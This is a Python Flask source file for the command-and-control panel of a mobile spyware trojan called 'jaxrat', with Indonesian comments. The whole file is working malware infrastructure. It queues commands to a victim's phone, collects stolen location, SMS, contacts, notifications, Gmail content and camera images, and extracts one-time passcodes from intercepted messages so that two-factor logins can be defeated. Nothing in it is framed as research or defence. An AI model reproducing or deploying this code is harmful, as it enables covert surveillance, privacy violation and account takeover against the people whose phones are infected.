import os
import re
from flask import Flask, render_template, request, jsonify, session, redirect, url_for

app = Flask(__name__)
app.secret_key = 'jaxrat_secret_key_v1_sangat_rahasia'

USERNAME = "admin"
PASSWORD = "jaxrat123"

devices = {"hp_target_1": {"name": "HP Target", "status": "online", "last_seen": "-", "anti_uninstall": True}}
latest_commands = {"hp_target_1": "none"}
latest_results = {"hp_target_1": {"gps": "Belum ada data", "sms": [], "contacts": [], "notifs": [], "gmail": []}}

UPLOAD_FOLDER = os.path.join(app.root_path, 'static', 'uploads')
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

# Fungsi buat nge-filter OTP yang pinter
def ekstrak_otp(teks):
    # Cari pola umum OTP (kode, otp, verifikasi, sandi) diikuti 4-6 digit
    pola_kontekstual = r'(?i)(?:otp|kode|verifikasi|code|sandi|pin)[\s:]*(\d{4,6})'
    match = re.search(pola_kontekstual, teks)
    if match: return match.group(1)
    
    # Fallback: Cari angka 4-6 digit, TAPI bukan tahun (19xx atau 20xx)
    semua_angka = re.findall(r'\b\d{4,6}\b', teks)
    for angka in semua_angka:
        if not (angka.startswith('19') or angka.startswith('20')):
            return angka
            
    return ""

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        if request.form['username'] == USERNAME and request.form['password'] == PASSWORD:
            session['logged_in'] = True
            return redirect(url_for('index'))
        return render_template('login.html', error="Akses Ditolak!")
    return render_template('login.html')

@app.route('/logout')
def logout():
    session.pop('logged_in', None)
    return redirect(url_for('login'))

@app.route('/')
def index():
    if not session.get('logged_in'): return redirect(url_for('login'))
    return render_template('index.html', devices=devices)

@app.route('/device/<device_id>')
def device_panel(device_id):
    if not session.get('logged_in'): return redirect(url_for('login'))
    if device_id not in devices: return "Perangkat tidak ditemukan", 404
    return render_template('panel.html', device_id=device_id, device=devices[device_id])

@app.route('/api/command/<device_id>', methods=['POST'])
def receive_command(device_id):
    if not session.get('logged_in'): return jsonify({"status": "error"}), 401
    data = request.json
    cmd = data.get("command")
    latest_commands[device_id] = cmd
    return jsonify({"status": "success"})

@app.route('/api/get_command/<device_id>', methods=['GET'])
def get_command(device_id):
    cmd = latest_commands.get(device_id, "none")
    latest_commands[device_id] = "none"
    return jsonify({"command": cmd})

@app.route('/api/upload_result/<device_id>', methods=['POST'])
def upload_result(device_id):
    data = request.json
    if device_id in latest_results:
        tipe = data.get("type")
        if tipe == "gps": latest_results[device_id]["gps"] = data.get("data")
        elif tipe == "sms": latest_results[device_id]["sms"] = data.get("data")
        elif tipe == "contacts": latest_results[device_id]["contacts"] = data.get("data")
        elif tipe == "gmail":
            text = data.get("data", "")
            otp_code = ekstrak_otp(text)
            
            gmail_entry = {"text": text, "otp": otp_code}
            gmail_list = latest_results[device_id]["gmail"]
            gmail_list.insert(0, gmail_entry)
            if len(gmail_list) > 3: gmail_list.pop()
            
            print(f"[SPY] Gmail masuk. OTP: {otp_code if otp_code else 'Tidak ada'}")
    return jsonify({"status": "success"})

@app.route('/api/upload_notification/<device_id>', methods=['POST'])
def upload_notification(device_id):
    data = request.json
    if device_id in latest_results:
        notif_list = latest_results[device_id]["notifs"]
        notif_list.insert(0, data)
        if len(notif_list) > 30: notif_list.pop()
    return jsonify({"status": "success"})

@app.route('/api/get_results/<device_id>', methods=['GET'])
def get_results(device_id):
    if not session.get('logged_in'): return jsonify({"status": "error"}), 401
    return jsonify(latest_results.get(device_id, {}))

@app.route('/api/clear_result/<device_id>/<result_type>', methods=['POST'])
def clear_result(device_id, result_type):
    if not session.get('logged_in'): return jsonify({"status": "error"}), 401
    if device_id in latest_results:
        if result_type == "gps": latest_results[device_id]["gps"] = "Belum ada data"
        elif result_type == "sms": latest_results[device_id]["sms"] = []
        elif result_type == "contacts": latest_results[device_id]["contacts"] = []
        elif result_type == "notifs": latest_results[device_id]["notifs"] = []
        elif result_type == "gmail": latest_results[device_id]["gmail"] = []
    return jsonify({"status": "success"})

@app.route('/api/set_blocked_apps/<device_id>', methods=['POST'])
def set_blocked_apps(device_id):
    if not session.get('logged_in'): return jsonify({"status": "error"}), 401
    apps = request.json.get("apps", "")
    latest_commands[device_id] = f"block_apps|{apps}"
    return jsonify({"status": "success"})

@app.route('/api/upload_image/<device_id>', methods=['POST'])
def upload_image(device_id):
    if 'image' not in request.files: return jsonify({"status": "error"}), 400
    file = request.files['image']
    if file.filename == '': return jsonify({"status": "error"}), 400
    file.save(os.path.join(UPLOAD_FOLDER, 'latest.jpg'))
    return jsonify({"status": "success"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
